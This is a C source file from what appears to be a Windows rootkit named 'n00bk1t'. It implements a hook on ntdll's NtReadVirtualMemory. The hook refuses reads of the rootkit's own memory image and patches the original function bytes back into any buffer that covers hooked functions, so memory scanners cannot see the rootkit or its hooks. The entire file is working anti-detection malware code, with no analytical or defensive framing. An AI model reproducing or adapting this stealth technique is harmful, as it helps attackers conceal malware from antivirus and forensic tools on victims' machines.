#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "n00bk1t.h"
#include "engine.h"

#include "ntreadvirtualmemory.h"

extern HOOKTABLE*	HookTable;
extern HOOKTABLE	HookTableEnd;
extern HMODULE n00bk1tBaseAddress;

// ntdll.NtReadVirtualMemory, hiding memory
NTSTATUS WINAPI NewNtReadVirtualMemory(
  HANDLE ProcessHandle,
  PVOID BaseAddress,
  PVOID Buffer,
  ULONG NumberOfBytesToRead,
  PULONG NumberOfBytesReaded
)
{
	HOOKTABLE RemoteHookTable[sizeof(HookTable)];
	NTSTATUS rc;
	DWORD dwImgSize;
	DWORD dwOffset;
	DWORD dwLen;
	INT i;
	
	// "hide" ourselfs
	dwImgSize=engine_GetPEImageSize(n00bk1tBaseAddress);
	if (((DWORD)BaseAddress>=(DWORD)n00bk1tBaseAddress)&&((DWORD)BaseAddress<=((DWORD)n00bk1tBaseAddress+dwImgSize))||
		((DWORD)BaseAddress<(DWORD)n00bk1tBaseAddress)&&((DWORD)BaseAddress+NumberOfBytesToRead>=(DWORD)n00bk1tBaseAddress))
	{
		if (NumberOfBytesReaded) *NumberOfBytesReaded=0;
		return STATUS_PARTIAL_COPY;
	}
	
	// call original function
	rc=OldNtReadVirtualMemory(
			ProcessHandle,
			BaseAddress,
			Buffer,
			NumberOfBytesToRead,
			NumberOfBytesReaded
			);

	
	// hooks are protected !
	if (NT_SUCCESS(rc))
	{
		// read process' hooktable
		if (NT_SUCCESS(OldNtReadVirtualMemory(ProcessHandle,&HookTable,RemoteHookTable,sizeof(HookTable),NULL)))
		{
			// fixup addresses
			for (i=0;i<sizeof(HookTable)/sizeof(HookTableEnd);i++)
			{
				engine_LoadRemoteVar(ProcessHandle,RemoteHookTable[i].lpOldFunction,&RemoteHookTable[i].lpOldFunction);
			}
			
			for (i=0;i<sizeof(HookTable)/sizeof(HookTableEnd);i++)
			{
				// write original functions to buffer
				if (RemoteHookTable[i].lpOldFunction&&RemoteHookTable[i].lpFunctionAddress)
				{
					if (((DWORD)BaseAddress<(DWORD)RemoteHookTable[i].lpFunctionAddress)&&((DWORD)((char*)BaseAddress+NumberOfBytesToRead)>=(DWORD)RemoteHookTable[i].lpFunctionAddress))
					{
						dwLen=(DWORD)((char*)BaseAddress+NumberOfBytesToRead)-(DWORD)RemoteHookTable[i].lpFunctionAddress;
						if (dwLen>RemoteHookTable[i].dwOldFunctionSize) dwLen=RemoteHookTable[i].dwOldFunctionSize;
						dwOffset=(DWORD)RemoteHookTable[i].lpFunctionAddress-(DWORD)BaseAddress;
						OldNtReadVirtualMemory(ProcessHandle,RemoteHookTable[i].lpOldFunction,(char*)Buffer+dwOffset,dwLen,NULL);
					}
					else if (((DWORD)BaseAddress>=(DWORD)RemoteHookTable[i].lpFunctionAddress)&&((DWORD)BaseAddress<(DWORD)((char*)RemoteHookTable[i].lpFunctionAddress+RemoteHookTable[i].dwOldFunctionSize)))
					{
						dwLen=(DWORD)((char*)RemoteHookTable[i].lpFunctionAddress+RemoteHookTable[i].dwOldFunctionSize)-(DWORD)BaseAddress;
						if (dwLen>NumberOfBytesToRead) dwLen=NumberOfBytesToRead;
						dwOffset=(DWORD)BaseAddress-(DWORD)RemoteHookTable[i].lpFunctionAddress;
						if (dwOffset<RemoteHookTable[i].dwOldFunctionSize)
							OldNtReadVirtualMemory(ProcessHandle,(char*)RemoteHookTable[i].lpOldFunction+dwOffset,Buffer,dwLen,NULL);
					}
				}	
			}
		}
	}

	return rc;
}